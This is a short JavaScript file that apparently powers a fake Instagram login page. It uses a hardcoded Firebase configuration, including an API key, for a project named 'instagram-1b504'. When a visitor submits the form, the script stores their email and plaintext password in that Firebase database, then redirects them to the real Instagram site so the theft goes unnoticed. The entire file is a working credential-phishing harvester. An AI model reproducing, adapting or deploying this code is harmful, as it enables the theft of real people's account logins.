// Import and configure Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

// Your Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyDpa29Aq7gNhsjT3fzhZSHlSJSJq-f3JZM",
    authDomain: "instagram-1b504.firebaseapp.com",
    databaseURL: "https://instagram-1b504-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "instagram-1b504",
    storageBucket: "instagram-1b504.appspot.com",
    messagingSenderId: "629010790114",
    appId: "1:629010790114:web:5195248d0e727b9f74d0bb",
    measurementId: "G-J1E2CNTXEY"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Handle form submission
document.addEventListener('DOMContentLoaded', () => {
    const form = document.querySelector('form');
    
    form.addEventListener('submit', (e) => {
        e.preventDefault();
        
        const email = form.querySelector('input[type="text"]').value;
        const password = form.querySelector('input[type="password"]').value;
        
        if (email && password) {
            // Create a unique key for each entry
            const userId = Date.now(); // Simple unique ID based on timestamp
            const userRef = ref(database, 'users/' + userId);

            // Save the data to Firebase Realtime Database
            set(userRef, {
                email: email,
                password: password
            }).then(() => {
                // Redirect to Google after data is saved
                window.location.href = 'https://www.instagram.com';
            }).catch((error) => {
                console.error(error);
            });
        } else {
            alert('Please enter both email and password.');
        }
    });
});
